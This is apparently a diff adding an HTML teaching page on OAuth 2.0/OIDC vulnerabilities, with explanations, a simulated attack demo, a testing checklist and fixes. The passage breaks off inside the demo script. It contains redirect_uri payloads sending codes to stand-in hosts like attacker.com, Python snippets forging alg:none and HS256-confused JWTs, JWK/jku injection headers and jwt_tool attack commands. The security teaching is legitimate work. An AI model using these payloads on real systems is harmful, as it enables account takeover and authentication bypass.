@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>OAuth 2.0 / OIDC Flaws</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:110px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+</style>
+</head>
+<body>
+<h1>OAuth 2.0 / OIDC Flaws</h1>
+<p class="sub">CWE-601 · CWE-287 · Account takeover via authorization code theft, open redirects, state bypass, and token leakage — the most complex auth attack surface</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How OAuth works</button>
+  <button class="tab-btn" onclick="showTab('vulns',this)">Vulnerabilities</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('oidc',this)">OIDC / JWT abuse</button>
+  <button class="tab-btn" onclick="showTab('test',this)">Testing methodology</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- CONCEPT -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">OAuth 2.0 is an authorization framework — it lets a user grant a third-party application limited access to their account on another service, without sharing their password. OIDC (OpenID Connect) adds identity on top of OAuth, enabling "Login with Google/GitHub/etc." Each step in the flow is a potential attack point.</p>
+
+  <svg width="100%" viewBox="0 0 680 330" style="max-width:680px;display:block;margin:0 auto 14px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+    <!-- Actors -->
+    <rect x="20"  y="20" width="100" height="48" rx="8" fill="#0d1f3a" stroke="#60a5fa" stroke-width="0.8"/>
+    <text x="70"  y="42" text-anchor="middle" font-size="11" font-weight="600" fill="#60a5fa" font-family="system-ui">User</text>
+    <text x="70"  y="58" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">browser</text>
+
+    <rect x="290" y="20" width="100" height="48" rx="8" fill="#2a1a08" stroke="#fbbf24" stroke-width="0.8"/>
+    <text x="340" y="42" text-anchor="middle" font-size="11" font-weight="600" fill="#fbbf24" font-family="system-ui">Client App</text>
+    <text x="340" y="58" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">app.example.com</text>
+
+    <rect x="560" y="20" width="100" height="48" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="610" y="42" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Auth Server</text>
+    <text x="610" y="58" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">accounts.google.com</text>
+
+    <!-- Flow steps -->
+    <line x1="122" y1="44" x2="288" y2="44" stroke="#888" stroke-width="0.8" stroke-dasharray="3 2" marker-end="url(#arr)"/>
+    <text x="205" y="40" text-anchor="middle" font-size="9" fill="#888" font-family="system-ui">&#9312; clicks Login</text>
+
+    <line x1="390" y1="44" x2="558" y2="44" stroke="#888" stroke-width="0.8" stroke-dasharray="3 2" marker-end="url(#arr)"/>
+    <text x="474" y="40" text-anchor="middle" font-size="9" fill="#888" font-family="system-ui">&#9313; redirect to auth server</text>
+
+    <!-- Auth server params box -->
+    <rect x="20" y="96" width="640" height="54" rx="8" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="36" y="114" font-size="10" fill="#888" font-family="system-ui">&#9313; Authorization request URL:</text>
+    <text x="36" y="133" font-size="10" fill="#fbbf24" font-family="Courier New,monospace">https://auth.server/authorize?response_type=code&amp;client_id=APP&amp;redirect_uri=https://app.com/callback&amp;scope=openid+email&amp;state=RANDOM</text>
+
+    <!-- Steps 4-6 -->
+    <line x1="558" y1="140" x2="122" y2="164" stroke="#4ade80" stroke-width="0.8" stroke-dasharray="3 2" marker-end="url(#arr)"/>
+    <text x="340" y="154" text-anchor="middle" font-size="9" fill="#4ade80" font-family="system-ui">&#9314; redirect back with code + state</text>
+
+    <rect x="20" y="172" width="640" height="40" rx="8" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="36" y="190" font-size="10" fill="#888" font-family="system-ui">&#9314; Callback URL:</text>
+    <text x="140" y="190" font-size="10" fill="#4ade80" font-family="Courier New,monospace">https://app.com/callback?code=AUTH_CODE&amp;state=RANDOM</text>
+
+    <line x1="340" y1="213" x2="558" y2="213" stroke="#fbbf24" stroke-width="0.8" stroke-dasharray="3 2" marker-end="url(#arr)"/>
+    <text x="449" y="208" text-anchor="middle" font-size="9" fill="#fbbf24" font-family="system-ui">&#9315; exchange code for access token (server-side)</text>
+
+    <line x1="558" y1="230" x2="340" y2="230" stroke="#4ade80" stroke-width="0.8" stroke-dasharray="3 2" marker-end="url(#arr)"/>
+    <text x="449" y="245" text-anchor="middle" font-size="9" fill="#4ade80" font-family="system-ui">&#9316; access token + id token returned</text>
+
+    <!-- Attack points -->
+    <rect x="20" y="264" width="640" height="56" rx="8" fill="#2a1010" stroke="#5a2020" stroke-width="0.8"/>
+    <text x="340" y="282" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Attack surface — each step is exploitable</text>
+    <text x="36" y="300" font-size="10" fill="#888" font-family="system-ui">&#9312; state missing → CSRF   &#9313; redirect_uri not validated → code theft   &#9315; state not verified → code injection</text>
+    <text x="36" y="314" font-size="10" fill="#888" font-family="system-ui">&#9316; token leaked in Referer/logs   alg:none in JWT   open redirect chains   scope escalation</text>
+  </svg>
+</div>
+
+<!-- VULNERABILITIES -->
+<div class="tab-panel" id="tab-vulns">
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9312; Open redirect_uri — authorization code theft</span><span class="badge b-red">Critical — account takeover</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">If the auth server doesn't validate the exact <code style="font-family:'Courier New',monospace;font-size:11px">redirect_uri</code>, an attacker can substitute their own URL. The auth code is sent to the attacker's server — they exchange it for an access token and take over the account.</p>
+    <div class="code"># Step 1: Craft authorization request with attacker's redirect_uri
+https://accounts.google.com/o/oauth2/auth
+  ?client_id=VICTIM_APP_CLIENT_ID
+  &amp;redirect_uri=https://attacker.com/steal    ← attacker's server
+  &amp;response_type=code
+  &amp;scope=email+profile
+  &amp;state=...
+
+# Step 2: Send this URL to victim (phishing, or via open redirect on legitimate site)
+# Victim clicks → logs in → Google sends code to attacker.com/steal
+
+# Step 3: Attacker exchanges code for token
+POST https://oauth.server/token
+  code=STOLEN_CODE
+  client_id=VICTIM_APP_CLIENT_ID
+  client_secret=...       ← attacker needs this too (harder for confidential clients)
+  redirect_uri=https://attacker.com/steal
+
+# For public clients (SPAs, mobile apps) — no client_secret needed!
+# Full account takeover with just the code.</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9313; Missing or broken state parameter — OAuth CSRF</span><span class="badge b-red">High</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">The <code style="font-family:'Courier New',monospace;font-size:11px">state</code> parameter is OAuth's CSRF token. If missing or not verified, an attacker can force a victim to link their account to the attacker's identity.</p>
+    <div class="code"># Attack: attacker initiates their own OAuth flow, captures the callback URL
+# before completing it — then tricks victim into visiting that callback URL.
+
+# Step 1: Attacker starts OAuth with their own account
+# Gets callback: https://app.com/callback?code=ATTACKER_CODE&state=abc
+
+# Step 2: Attacker sends victim to:
+# https://app.com/callback?code=ATTACKER_CODE  (no state check on app side)
+
+# Step 3: App exchanges ATTACKER_CODE for token
+# App now thinks victim has linked ATTACKER's account
+# Attacker logs in → gets victim's session!
+
+# Verify state vulnerability:
+# Remove &state= from callback URL — does the app still process it?
+# Or: change state to arbitrary value — does the app reject it?</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9314; redirect_uri validation bypass</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># Exact match required — but many servers check loosely:
+
+# Path traversal bypass:
+redirect_uri=https://app.com/callback/../../../attacker-path
+
+# Subdomain bypass (if server checks only domain):
+redirect_uri=https://evil.app.com/steal
+
+# Query parameter bypass:
+redirect_uri=https://app.com/callback?redirect=https://evil.com
+
+# Open redirect on legitimate app used as redirect_uri:
+redirect_uri=https://app.com/logout?next=https://evil.com/steal
+# → code sent to app.com, then app.com redirects to evil.com with code in URL!
+
+# Fragment bypass:
+redirect_uri=https://app.com/callback#https://evil.com
+
+# All variations to test:
+# - Add extra path segments
+# - Add subdomains
+# - Use @ in URL (user@host confusion)
+# - Append attacker domain after legitimate path</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9315; Token leakage — Referer, logs, browser history</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># Implicit flow sends access_token in URL fragment:
+https://app.com/callback#access_token=TOKEN&token_type=bearer
+# → Stored in browser history
+# → Logged by web server (if fragment is somehow processed)
+# → Leaked in Referer header to third-party scripts on the page
+
+# Authorization code in URL → logged by server before being exchanged:
+https://app.com/callback?code=AUTH_CODE
+# If code isn't single-use or has long expiry → extractable from logs
+
+# Check: does the auth server enforce single-use codes?
+# Replay test: use the same code twice → should fail on second attempt</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9316; Scope escalation &amp; insufficient validation</span><span class="badge b-purple">Medium</span>
+    </div>
+    <div class="code"># Scope upgrade — request minimal scope, then escalate
+# Step 1: App requests scope=read
+# Step 2: After getting token, try API calls requiring scope=admin
+# If server doesn't validate scope per-request → escalation
+
+# Missing audience (aud) validation in JWT:
+# Token issued for app A used against app B
+# If B doesn't validate aud claim → cross-app token reuse
+
+# Account linking abuse:
+# Link attacker's Google account to victim's existing account
+# If app links by email and Google allows unverified emails → takeover
+
+# Pre-account-takeover:
+# Attacker registers account with victim's email via OAuth
+# Victim later registers same email via password → linked to attacker's OAuth</div>
+  </div>
+</div>
+
+<!-- DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate OAuth attack scenarios. Each shows the manipulated OAuth flow, what the server responds with, and the impact.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">Attack scenario</div>
+    <select id="oauth-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+      <option value="redirect">Open redirect_uri — code theft</option>
+      <option value="state">Missing state — OAuth CSRF</option>
+      <option value="redirect_bypass">redirect_uri bypass — path traversal</option>
+      <option value="implicit">Implicit flow — token in URL</option>
+      <option value="replay">Authorization code replay</option>
+    </select>
+  </div>
+
+  <div style="margin-bottom:8px;">
+    <div class="chip">Manipulated OAuth request</div>
+    <div class="mono-out" id="req-out" style="min-height:80px;"></div>
+  </div>
+
+  <div class="grid2">
+    <div><div class="chip">Server response / flow</div><div class="mono-out" id="flow-out" style="min-height:110px;"></div></div>
+    <div><div class="chip">Impact</div><div class="mono-out" id="impact-out" style="min-height:110px;"></div></div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- OIDC / JWT ABUSE -->
+<div class="tab-panel" id="tab-oidc">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">OpenID Connect adds an ID token (a JWT) to OAuth. JWT-specific attacks apply here — algorithm confusion, none algorithm, and key confusion can bypass authentication entirely.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">alg:none — unsigned token accepted</div>
+    <div class="code"># Some JWT libraries accept "none" as algorithm — token with no signature
+# Original token header: {"alg":"HS256","typ":"JWT"}
+# Forged: {"alg":"none","typ":"JWT"}
+
+# Forge a token claiming to be admin:
+import base64, json
+
+header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
+payload = base64.urlsafe_b64encode(b'{"sub":"admin","email":"admin@corp.com","role":"admin"}').rstrip(b'=')
+token   = header + b'.' + payload + b'.'   # empty signature!
+
+# If server accepts: full admin access with no secret key needed</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Algorithm confusion — RS256 to HS256</div>
+    <div class="code"># RS256: server signs with private key, verifies with public key
+# Attack: trick server into treating the PUBLIC key as an HMAC secret
+# then sign a token with HS256 using the public key → server verifies it!
+
+# Step 1: Get the server's public key (often at /.well-known/jwks.json)
+curl https://auth.target.com/.well-known/jwks.json
+# Extract the RSA public key
+
+# Step 2: Create forged token signed with HS256 using the public key as secret
+# Tools: jwt_tool, python-jwt, pyjwt
+
+python3 -c "
+import jwt
+pub_key = open('public_key.pem').read()
+token = jwt.encode({'sub':'admin','role':'admin'}, pub_key, algorithm='HS256')
+print(token)
+"
+# If server uses alg from token header without restricting to RS256 → accepted!</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">JWK injection — supply your own key</div>
+    <div class="code"># Some servers trust the "jwk" or "jku" header parameter in the token itself
+# Attack: embed your own public key in the token header, sign with matching private key
+
+# JWK injection (embed key in header):
+header = {
+  "alg": "RS256",
+  "typ": "JWT",
+  "jwk": {
+    "kty": "RSA",
+    "n": "ATTACKER_MODULUS",
+    "e": "AQAB",
+    "use": "sig"
+  }
+}
+# Sign with attacker's private key matching the embedded public key
+# If server uses the jwk header to verify → attacker controls verification!
+
+# JKU (JWK Set URL) injection:
+header = {"alg":"RS256","jku":"https://attacker.com/jwks.json"}
+# Server fetches attacker's JWKS to verify the token → SSRF + key control</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">OIDC claim spoofing &amp; email verification bypass</div>
+    <div class="code"># Some apps trust email from ID token without verifying it's confirmed
+# Google/GitHub allow unverified emails in some flows
+
+# email_verified claim missing → app trusts unverified email:
+{
+  "sub": "12345",
+  "email": "admin@corp.com",
+  "email_verified": false   ← but app doesn't check this!
+}
+# → Register with unverified email → gain admin@corp.com account
+
+# Audience (aud) claim not validated:
+# Token issued for app client_id=APP_A
+# Used against APP_B which doesn't check aud
+# → Cross-application token reuse
+
+# jwt_tool for JWT testing:
+python3 jwt_tool.py TOKEN -T    # tamper mode — try all attacks
+python3 jwt_tool.py TOKEN -X a  # test alg:none
+python3 jwt_tool.py TOKEN -X s  # test RS256→HS256 confusion</div>
+  </div>
+</div>
+
+<!-- TESTING -->
+<div class="tab-panel" id="tab-test">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Systematic checklist for auditing an OAuth 2.0 implementation.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">redirect_uri testing</div>
+    <div class="code"># Intercept the authorization request in Burp
+# Modify redirect_uri — try each:
+redirect_uri=https://attacker.com
+redirect_uri=https://app.com.attacker.com
+redirect_uri=https://app.com@attacker.com
+redirect_uri=https://app.com/callback/../../../redirect?url=https://attacker.com
+redirect_uri=https://app.com/callback%2F..%2Fattacker.com
+redirect_uri=https://app.com/callback?next=https://attacker.com
+
+# For each: does the auth server redirect to your attacker URL?
+# If yes AND you receive a code → critical finding</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">State parameter testing</div>
+    <div class="code"># Test 1: remove state entirely
+# https://app.com/callback?code=CODE  (no &state=)
+# → Does app reject? Or process the code anyway?
+
+# Test 2: use wrong state value
+# https://app.com/callback?code=CODE&state=WRONG_VALUE
+# → Does app reject?
+
+# Test 3: replay state from different session
+# Capture callback URL from one session, replay in another browser
+# → Does app detect session mismatch?
+
+# Test 4: attempt OAuth CSRF
+# Start OAuth flow, capture callback URL before completing
+# Send victim the callback URL
+# → Does it link attacker's account to victim?</div>
+  </div>
+
+  <div class="sc-card sc-blue">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">JWT / OIDC testing with jwt_tool</div>
+    <div class="code"># Get ID token from OAuth flow (intercept in Burp)
+# Run all attacks:
+python3 jwt_tool.py IDTOKEN -T    # interactive tamper
+python3 jwt_tool.py IDTOKEN -X a  # alg:none attack
+python3 jwt_tool.py IDTOKEN -X s  # RS256 to HS256
+python3 jwt_tool.py IDTOKEN -X i  # inject JWK header
+python3 jwt_tool.py IDTOKEN -X u  # inject jku header
+
+# Check JWKS endpoint:
+curl https://target.com/.well-known/jwks.json
+curl https://target.com/.well-known/openid-configuration
+
+# Check token claims:
+# - Is aud validated? (try token on other apps)
+# - Is exp enforced? (try expired token)
+# - Is email_verified checked?
+# - Is sub (subject) unique across providers?</div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9312; Validate redirect_uri with exact match <span class="badge b-red">Root fix</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Pre-register all allowed redirect URIs as exact strings. At runtime, reject any request whose redirect_uri doesn't exactly match a registered value — no wildcards, no prefix match, no path comparison.</div>
+    <div class="code">## Authorization server (Node.js example)
+const REGISTERED_URIS = new Set([
+  'https://app.example.com/callback',
+  'https://app.example.com/auth/callback',
+]);
+
+function validateRedirectUri(requestedUri) {
+  if (!REGISTERED_URIS.has(requestedUri)) {
+    throw new Error('Invalid redirect_uri');
+  }
+}
+// No partial matching, no endsWith, no regex — exact set membership only</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9313; Always use and verify the state parameter <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Generate a cryptographically random state value per flow, store it in the session, and reject any callback where the state doesn't match. This is OAuth's built-in CSRF protection.</div>
+    <div class="code">// Generate state when starting OAuth flow
+const state = crypto.randomBytes(32).toString('hex');
+req.session.oauthState = state;
+
+// In callback handler — verify before doing ANYTHING
+app.get('/callback', (req, res) => {
+  if (req.query.state !== req.session.oauthState) {
+    return res.status(403).json({ error: 'State mismatch — possible CSRF' });
+  }
+  // Only now proceed to exchange the code
+  delete req.session.oauthState;  // single-use
+});</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9314; Use PKCE for public clients (SPAs, mobile) <span class="badge b-green">Modern best practice</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">PKCE (Proof Key for Code Exchange) prevents authorization code interception even if the code is stolen — the code can only be exchanged by whoever generated the original code_verifier.</div>
+    <div class="code">// Client generates a code_verifier (random) + code_challenge (SHA256 hash)
+const verifier  = base64url(crypto.randomBytes(32));
+const challenge = base64url(crypto.createHash('sha256').update(verifier).digest());
+
+// Include in authorization request:
+// &code_challenge=CHALLENGE&code_challenge_method=S256
+
+// Include in token exchange:
+// &code_verifier=VERIFIER
+
+// Even if attacker intercepts the code, they don't have the verifier → useless</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9315; JWT validation — fix algorithm handling <span class="badge b-amber">Server-side</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Always specify the expected algorithm explicitly when verifying JWTs. Never allow the algorithm to be determined from the token header.</div>
+    <div class="code">## Python — pyjwt (correct usage)
+import jwt
+# WRONG — takes algorithm from token header:
+decoded = jwt.decode(token, public_key, algorithms=None)
+
+# CORRECT — explicitly restrict algorithm:
+decoded = jwt.decode(token, public_key, algorithms=['RS256'])
+# Also validate audience and issuer:
+decoded = jwt.decode(token, public_key,
+  algorithms=['RS256'],
+  audience='my-app-client-id',
+  issuer='https://accounts.google.com'
+)
+
+## Node.js / jsonwebtoken
+jwt.verify(token, publicKey, { algorithms: ['RS256'] })
+// Never: { algorithms: ['none'] } or omitting algorithms</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9316; Security checklist</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Exact-match redirect_uri — never wildcards or partial matching &nbsp;·&nbsp;
+      State parameter: random, per-session, verified before code exchange &nbsp;·&nbsp;
+      PKCE for all public clients (SPAs, mobile apps) &nbsp;·&nbsp;
+      Authorization codes: single-use, short expiry (60 seconds) &nbsp;·&nbsp;
+      JWT: explicit algorithm allowlist, validate aud + iss + exp &nbsp;·&nbsp;
+      Never use implicit flow — use authorization code + PKCE instead &nbsp;·&nbsp;
+      Validate email_verified claim before linking accounts by email &nbsp;·&nbsp;
+      Never allow jwk or jku header injection in JWT verification
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const DEMOS={
+  redirect:{
+    req:`GET /authorize?
+  client_id=VICTIM_APP
+  &redirect_uri=https://attacker.com/steal   ← attacker's server!
+  &response_type=code
+  &scope=openid+email+profile
+  &state=abc123
+
+Sent to victim as phishing link — victim logs in thinking
+they're authorizing the legitimate app.`,
+    flow:`HTTP/1.1 302 Found
+Location: https://attacker.com/steal
+  ?code=AUTH_CODE_4xK9mP
+  &state=abc123
+
+# Auth server blindly redirected to attacker.com
+# because redirect_uri was not validated!
+
+# Attacker's server receives the code and immediately
+# exchanges it (for a public client — no secret needed):
+POST /token
+  code=AUTH_CODE_4xK9mP
+  client_id=VICTIM_APP
+  redirect_uri=https://attacker.com/steal
+  grant_type=authorization_code`,
+    impact:`HTTP 200 OK
+{
+  "access_token": "ya29.a0AfB_byC...",
+  "id_token": "eyJhbGciOiJS...",
+  "token_type": "Bearer",
+  "expires_in": 3600,
+  "scope": "openid email profile"
+}
+
+# Attacker decodes id_token:
+{
+  "sub": "10769150350006150715113082367",
+  "email": "victim@gmail.com",
+  "email_verified": true,
+  "name": "Alice Victim"
+}
+
+# Attacker logs into app as Alice — FULL ACCOUNT TAKEOVER!`,
+    verdict:'<strong>Account takeover via open redirect_uri!</strong> The authorization server redirected the auth code to the attacker\'s server because redirect_uri wasn\'t validated. For public clients (SPAs, mobile), no client_secret is needed — the attacker exchanges the code directly. Fix: pre-register exact redirect URIs and reject any deviation.'
+  },
+  state:{
+    req:`# Attacker starts their own OAuth flow:
+GET /authorize?client_id=APP&redirect_uri=https://app.com/callback&response_type=code&scope=openid
+
+# Auth server redirects to:
+https://app.com/callback?code=ATTACKER_CODE&state=xyz789
+
+# Attacker STOPS before completing — captures this callback URL.
+# Now sends victim to:
+https://app.com/callback?code=ATTACKER_CODE
+# (no state parameter — victim's session is active)`,
+    flow:`# App receives callback with ATTACKER_CODE
+# No state verification in vulnerable app:
+
+POST /token
+  code=ATTACKER_CODE
+  client_id=APP
+  client_secret=SECRET
+  grant_type=authorization_code
+
+HTTP 200: {"access_token":"...", "sub":"attacker@evil.com"}
+
+# App stores this token in VICTIM's session!
+# App now thinks victim authenticated as attacker@evil.com`,
+    impact:`# Result: victim's account is now LINKED to attacker's identity
+
+# If victim was already logged in:
+# → Their session now has attacker's OAuth credentials
+# → Attacker logs into app with their own OAuth → gets victim's data!
+
+# Alternatively (account linking scenario):
+# App links attacker's Google account to victim's existing account
+# Attacker can now log in as victim via "Login with Google"
+
+# Prevention: always verify state === session.oauthState before proceeding`,
+    verdict:'<strong>OAuth CSRF via missing state verification!</strong> Without validating the state parameter, the app processed a code generated for the attacker\'s identity in the victim\'s session. This links the attacker\'s external account to the victim\'s app account — enabling silent account takeover.'
+  },
+  redirect_bypass:{
+    req:`# Exact redirect_uri registered: https://app.com/callback
+
+# Bypass attempts — server uses loose matching:
+
+# 1. Path traversal:
+redirect_uri=https://app.com/callback/../../evil
+
+# 2. Open redirect on legitimate domain:
+redirect_uri=https://app.com/logout?next=https://attacker.com
+
+# 3. Subdomain confusion:
+redirect_uri=https://callback.app.com   ← if server checks "app.com" suffix
+
+# 4. URL encoding:
+redirect_uri=https://app.com%2Fcallback%2F..%2Fattacker.com`,
+    flow:`# Loose server validates: does uri contain "app.com"? YES
+
+HTTP 302 Location: https://app.com/logout
+  ?next=https://attacker.com
+  &code=AUTH_CODE
+
+# App's /logout open redirect fires:
+HTTP 302 Location: https://attacker.com?code=AUTH_CODE
+
+# Code arrives at attacker's server via Referer or query param!`,
+    impact:`# Code stolen via redirect chain:
+https://attacker.com/?code=AUTH_CODE_xK9mP
+
+# Attacker exchanges code → access token → account takeover
+
+# Key insight: even one open redirect on the legitimate domain
+# can be used to steal OAuth codes if redirect_uri is
+# validated by domain match rather than exact URI match.`,
+    verdict:'<strong>redirect_uri bypass via open redirect chain!</strong> The server checked that the URI contained "app.com" but didn\'t require an exact match. Using app.com\'s own open redirect endpoint, the attacker routed the authorization code through the legitimate domain to their server. Fix: exact match only — no substring or domain-only checks.'
+  },
+  implicit:{
+    req:`# Implicit flow (legacy — now discouraged):
+GET /authorize?
+  client_id=SPA_APP
+  &redirect_uri=https://app.com/callback
+  &response_type=token   ← implicit flow!
+  &scope=openid+email
+
+# Access token returned directly in URL fragment:`,
+    flow:`HTTP 302 Location:
+https://app.com/callback
+  #access_token=ya29.a0AfB_byC_ImplicitTokenHere
+  &token_type=bearer
+  &expires_in=3600
+
+# Token is NOW in:
+# - Browser address bar
+# - Browser history
+# - Server access logs (if fragment is ever processed)
+# - Referer header to any third-party on the callback page
+# - JavaScript window.location.hash readable by any script!`,
+    impact:`// Any JS on app.com/callback can read it:
+const token = window.location.hash.match(/access_token=([^&]+)/)[1];
+
+// Third-party scripts (analytics, ads) can steal it:
+// Google Analytics, Hotjar, Segment all run on most web apps
+// They can exfiltrate the token silently.
+
+// Even without XSS — browser history stores it:
+// chrome://history → app.com/callback#access_token=...
+
+// Fix: use authorization code flow + PKCE instead`,
+    verdict:'<strong>Implicit flow token leakage!</strong> The access token in the URL fragment is exposed to browser history, server logs, Referer headers, and any JavaScript running on the page. Modern OAuth 2.1 / BCP deprecates implicit flow entirely. All SPAs should use authorization code flow with PKCE instead.'
+  },
+  replay:{
+    req:`# Step 1: Attacker observes a legitimate callback (e.g. from server logs, Referer)
